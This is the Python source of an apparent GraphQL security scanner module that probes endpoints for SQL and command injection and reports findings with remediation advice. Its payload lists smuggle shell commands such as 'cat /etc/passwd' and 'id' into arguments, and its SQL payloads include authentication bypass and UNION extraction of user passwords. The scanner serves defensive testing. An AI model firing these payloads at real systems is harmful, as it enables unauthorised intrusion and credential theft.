"""
GrapeQL Injection Tester
Author: Aleksa Zatezalo
Version: 2.0
Date: April 2025
Description: Tests GraphQL endpoints for SQL and command injection vulnerabilities
"""

import time
from typing import Dict, List, Optional, Tuple, Any
import json
from .tester import VulnerabilityTester
from .utils import Finding


class InjectionTester(VulnerabilityTester):
    """
    Tests GraphQL endpoints for SQL and command injection vulnerabilities.
    """

    def __init__(self):
        """Initialize the injection tester."""
        super().__init__()
        self.test_name = "GraphQL Injection Testing"
        self.username = "admin"
        self.password = "changeme"

    def set_credentials(self, username: str, password: str) -> None:
        """
        Set credentials for use in testing authentication-related issues.

        Args:
            username: Username for testing
            password: Password for testing
        """
        self.username = username
        self.password = password
        self.printer.print_msg(
            f"Set credentials: {username}:{password}", status="success"
        )

    def generate_command_injection_payloads(self) -> List[str]:
        """
        Generate command injection test payloads.

        Returns:
            List[str]: Command injection payloads to test
        """
        return [
            # Basic Command Execution
            ";id",
            "|id",
            "||id",
            "&& id",
            # File Reading
            ";cat /etc/passwd",
            "|cat /etc/passwd",
            "||cat /etc/passwd",
            "&& cat /etc/passwd",
            # System Information
            ";uname -a",
            "|uname -a",
            "||uname -a",
            "&& uname -a",
            # Backtick variations (properly escaped)
            "`cat /etc/passwd`",
            "`id`",
            "`uname -a`",
            # Dollar variations
            "$(cat /etc/passwd)",
            "$(id)",
            "$(uname -a)",
            "uname -a",
            # Simple chaining
            ";cat /etc/passwd;id",
            "|cat /etc/passwd|id",
            "&&cat /etc/passwd&&id",
            "cat /etc/passwd",
            # With spaces
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
        ]

    def generate_sqli_payloads(self) -> List[str]:
        """
        Generate SQL injection test payloads.

        Returns:
            List[str]: SQL injection payloads to test
        """
        return [
            # Basic SQL Injection
            "'",
            "' OR 1=1 --",
            "' OR '1'='1",
            '" OR ""="',
            '" OR 1=1 --',
            "' OR 1=1 #",
            # Authentication bypass
            "admin' --",
            "admin' #",
            "admin'/*",
            # More complex injections
            "' UNION SELECT 1,2,3 --",
            "' OR 1=1 UNION SELECT 1,username,password FROM users --",
            # Error-based payloads
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --",
            # Boolean-based payloads
            "' AND 1=1 --",
            "' AND 1=0 --",
        ]

    async def test_field_for_injection(
        self, field_name: str, arg_name: str, payload: str, is_mutation: bool = False
    ) -> Tuple[bool, Optional[str], float]:
        """
        Test a specific field and argument for command injection vulnerabilities.

        Args:
            field_name: Name of the GraphQL field to test
            arg_name: Name of the argument to test
            payload: Injection payload to use
            is_mutation: Whether the field is a mutation

        Returns:
            Tuple[bool, Optional[str], float]: (is_vulnerable, details, response_time)
        """
        operation_type = "mutation" if is_mutation else "query"

        # Get field info from schema
        field_info = (
            self.client.mutation_fields.get(field_name)
            if is_mutation
            else self.client.query_fields.get(field_name)
        )

        if not field_info:
            return False, None, 0.0

        # Build arguments string including all required fields
        arg_strings = []

        # Build argument strings
        for arg in field_info["args"]:
            if arg["name"] == arg_name:
                # This is the argument we're testing - use the payload
                arg_strings.append(f'{arg["name"]}: "{payload}"')
            else:
                # For other arguments, provide appropriate values
                if arg["name"] == "username":
                    arg_strings.append(f'{arg["name"]}: "{self.username}"')
                elif arg["name"] == "password":
                    arg_strings.append(f'{arg["name"]}: "{self.password}"')
                elif arg["type"]["name"] == "Int":
                    arg_strings.append(f'{arg["name"]}: 1')
                elif arg["type"]["name"] == "Boolean":
                    arg_strings.append(f'{arg["name"]}: true')
                else:
                    arg_strings.append(f'{arg["name"]}: "test"')

        args_str = ", ".join(arg_strings)

        # Define common field selections for different types
        field_selections = {
            "CreatePaste": "{ id content title success error }",
            "DeletePaste": "{ success error }",
            "UpdatePaste": "{ id content success error }",
            "AuthResponse": "{ token error }",
            "UserResponse": "{ id username error }",
            "SystemResponse": "{ status message error }",
            "Default": "{ id message error success }",
        }

        # Build the query based on the field type
        if field_name in [
            "systemDiagnostics",
            "getVersion",
            "getStatus",
        ]:  # Known scalar returns
            query = f"""
            {operation_type} {{
                {field_name}({args_str})
            }}
            """
        else:  # Object types that need selections
            # Get the appropriate selection or use default
            selection = field_selections.get(
                field_name.replace("create", "Create")
                .replace("delete", "Delete")
                .replace("update", "Update"),
                field_selections["Default"],
            )
            query = f"""
            {operation_type} {{
                {field_name}({args_str}) {selection}
            }}
            """

        start_time = time.time()
        response, error = await self.client.graphql_query(query)
        duration = time.time() - start_time

        if error:
            return False, None, duration

        response_text = json.dumps(response)

        # Check for command injection indicators
        cmd_indicators = [
            "root:",  # /etc/passwd content
            "/bin/bash",
            "/bin/sh",
            ":/home/",
            "/usr/bin",
            "/var/log",
            "Permission denied",
            "command not found",
            "Linux",
        ]

        # Check for indicators in response
        for indicator in cmd_indicators:
            if indicator.lower() in response_text.lower():
                detail = f"Possible command injection in {field_name}.{arg_name} with payload: {payload}"
                return True, detail, duration

        return False, None, duration

    async def test_field_for_sqli(
        self, field_name: str, arg_name: str, payload: str, is_mutation: bool = False
    ) -> Tuple[bool, Optional[str], float]:
        """
        Test a specific field and argument for SQL injection vulnerabilities.

        Args:
            field_name: Name of the GraphQL field to test
            arg_name: Name of the argument to test
            payload: Injection payload to use
            is_mutation: Whether the field is a mutation

        Returns:
            Tuple[bool, Optional[str], float]: (is_vulnerable, details, response_time)
        """
        operation_type = "mutation" if is_mutation else "query"

        # Get field info from schema
        field_info = (
            self.client.mutation_fields.get(field_name)
            if is_mutation
            else self.client.query_fields.get(field_name)
        )

        if not field_info:
            return False, None, 0.0

        # Build arguments string including all required fields
        arg_strings = []

        # Build argument strings
        for arg in field_info["args"]:
            if arg["name"] == arg_name:
                # This is the argument we're testing - use the payload
                arg_strings.append(f'{arg["name"]}: "{payload}"')
            else:
                # For other arguments, provide appropriate values
                if arg["name"] == "username":
                    arg_strings.append(f'{arg["name"]}: "{self.username}"')
                elif arg["name"] == "password":
                    arg_strings.append(f'{arg["name"]}: "{self.password}"')
                elif arg["type"]["name"] == "Int":
                    arg_strings.append(f'{arg["name"]}: 1')
                elif arg["type"]["name"] == "Boolean":
                    arg_strings.append(f'{arg["name"]}: true')
                else:
                    arg_strings.append(f'{arg["name"]}: "test"')

        args_str = ", ".join(arg_strings)

        # Define common field selections for different types
        field_selections = {
            "CreatePaste": "{ id content title success error }",
            "DeletePaste": "{ success error }",
            "UpdatePaste": "{ id content success error }",
            "AuthResponse": "{ token error }",
            "UserResponse": "{ id username error }",
            "SystemResponse": "{ status message error }",
            "Default": "{ id message error success }",
        }

        # Build the query based on the field type
        if field_name in [
            "systemDiagnostics",
            "getVersion",
            "getStatus",
        ]:  # Known scalar returns
            query = f"""
            {operation_type} {{
                {field_name}({args_str})
            }}
            """
        else:  # Object types that need selections
            # Get the appropriate selection or use default
            selection = field_selections.get(
                field_name.replace("create", "Create")
                .replace("delete", "Delete")
                .replace("update", "Update"),
                field_selections["Default"],
            )
            query = f"""
            {operation_type} {{
                {field_name}({args_str}) {selection}
            }}
            """

        start_time = time.time()
        response, error = await self.client.graphql_query(query)
        duration = time.time() - start_time

        if error:
            return False, None, duration

        response_text = json.dumps(response)

        # Check for SQL injection indicators in response
        sql_indicators = [
            "SQL syntax",
            "SQLite",
            "MySQL",
            "PostgreSQL",
            "ORA-",
            "SQL Server",
            "ORDER BY",
            "UNION",
            "HAVING",
            "LIMIT",
            "ERROR: syntax error at or near",
            "ERROR: unterminated quoted string at or near",
            "ERROR: unterminated quoted identifier at or near",
            "ERROR: column",
            "ERROR: operator does not exist",
            "ERROR: invalid input syntax for",
            "ERROR: relation",
            "ERROR: permission denied for",
            "ERROR: division by zero",
            "ERROR: PL/pgSQL",
            "ERROR: out of range",
            "ERROR: cannot insert into column",
            "SQLSTATE[",
            "PG::Error:",
        ]

        # Check for indicators in response
        for indicator in sql_indicators:
            if indicator.lower() in response_text.lower():
                detail = f"Possible SQL injection in {field_name}.{arg_name} with payload: {payload}"
                return True, detail, duration

        return False, None, duration

    async def scan_field(
        self, field_name: str, is_mutation: bool = False
    ) -> List[Finding]:
        """
        Scan a specific field for command injection vulnerabilities.

        Args:
            field_name: Name of the field to test
            is_mutation: Whether this is a mutation field

        Returns:
            List[Finding]: Findings from testing this field
        """
        findings = []
        field_info = (
            self.client.mutation_fields.get(field_name)
            if is_mutation
            else self.client.query_fields.get(field_name)
        )

        if not field_info:
            return findings

        # Get string type arguments for testing
        string_args = [
            arg["name"]
            for arg in field_info["args"]
            if arg["type"]["name"] in ["String", "ID"]
        ]

        if not string_args:
            return findings

        # Get payloads
        cmd_payloads = self.generate_command_injection_payloads()

        # Test each argument with payloads
        for arg_name in string_args:
            self.printer.print_msg(
                f"Testing {'mutation' if is_mutation else 'query'} field for command injection: {field_name}.{arg_name}",
                status="log",
            )

            # Test command injection
            for payload in cmd_payloads:
                is_vulnerable, detail, duration = await self.test_field_for_injection(
                    field_name, arg_name, payload, is_mutation
                )

                if is_vulnerable:
                    finding = Finding(
                        title=f"Command Injection in {field_name}.{arg_name}",
                        severity="CRITICAL",
                        description=detail,
                        endpoint=self.client.endpoint,
                        impact="Command execution on the server, allowing attacker to execute arbitrary code and potentially gain full system access",
                        remediation="Implement proper input validation, use parameterized queries, avoid passing user input to shell commands, and apply the principle of least privilege",
                    )
                    findings.append(finding)
                    self.add_finding(finding)
                    # Skip remaining payloads for this arg once we find a vulnerability
                    break

        return findings

    async def scan_field_for_sqli(
        self, field_name: str, is_mutation: bool = False
    ) -> List[Finding]:
        """
        Scan a specific field for SQL injection vulnerabilities.

        Args:
            field_name: Name of the field to test
            is_mutation: Whether this is a mutation field

        Returns:
            List[Finding]: Findings from testing this field
        """
        findings = []
        field_info = (
            self.client.mutation_fields.get(field_name)
            if is_mutation
            else self.client.query_fields.get(field_name)
        )

        if not field_info:
            return findings

        # Get string type arguments for testing
        string_args = [
            arg["name"]
            for arg in field_info["args"]
            if arg["type"]["name"] in ["String", "ID"]
        ]

        if not string_args:
            return findings

        # Get payloads
        sqli_payloads = self.generate_sqli_payloads()

        # Test each argument with payloads
        for arg_name in string_args:
            self.printer.print_msg(
                f"Testing {'mutation' if is_mutation else 'query'} field for SQLi: {field_name}.{arg_name}",
                status="log",
            )

            # Test SQL injection
            for payload in sqli_payloads:
                is_vulnerable, detail, duration = await self.test_field_for_sqli(
                    field_name, arg_name, payload, is_mutation
                )

                if is_vulnerable:
                    finding = Finding(
                        title=f"SQL Injection in {field_name}.{arg_name}",
                        severity="CRITICAL",
                        description=detail,
                        endpoint=self.client.endpoint,
                        impact="Database access, extraction of sensitive data, authentication bypass, and potential complete system compromise",
                        remediation="Use parameterized queries, implement proper input validation, and ensure ORM sanitization is correctly applied",
                    )
                    findings.append(finding)
                    self.add_finding(finding)
                    # Skip remaining payloads for this arg once we find a vulnerability
                    break

        return findings

    async def run_test(self) -> List[Finding]:
        """
        Run all injection tests and return findings.

        Returns:
            List[Finding]: All findings from the test
        """
        if not self.client.endpoint or not (
            self.client.query_fields or self.client.mutation_fields
        ):
            self.printer.print_msg(
                "No endpoint set or schema not retrieved. Run setup_endpoint first.",
                status="error",
            )
            return self.findings

        self.printer.print_section("Starting Injection Testing")
        self.printer.print_msg(
            "This may take some time depending on the number of fields...",
            status="warning",
        )

        # Let the user know credentials will be used in all requests
        self.printer.print_msg(
            f"Using credentials username='{self.username}' and password='{self.password}' for all requests",
            status="log",
        )

        # Test SQL injection first
        self.printer.print_msg(
            "Testing for SQL injection vulnerabilities...", status="log"
        )

        # Test query fields for SQL injection
        for field_name in self.client.query_fields:
            await self.scan_field_for_sqli(field_name, is_mutation=False)

        # Test mutation fields for SQL injection
        for field_name in self.client.mutation_fields:
            await self.scan_field_for_sqli(field_name, is_mutation=True)

        # Test command injection
        self.printer.print_msg(
            "Testing for command injection vulnerabilities...", status="log"
        )

        # Test query fields for command injection
        for field_name in self.client.query_fields:
            await self.scan_field(field_name, is_mutation=False)

        # Test mutation fields for command injection
        for field_name in self.client.mutation_fields:
            await self.scan_field(field_name, is_mutation=True)

        if not self.findings:
            self.printer.print_msg(
                "No injection vulnerabilities found", status="success"
            )

        return self.findings
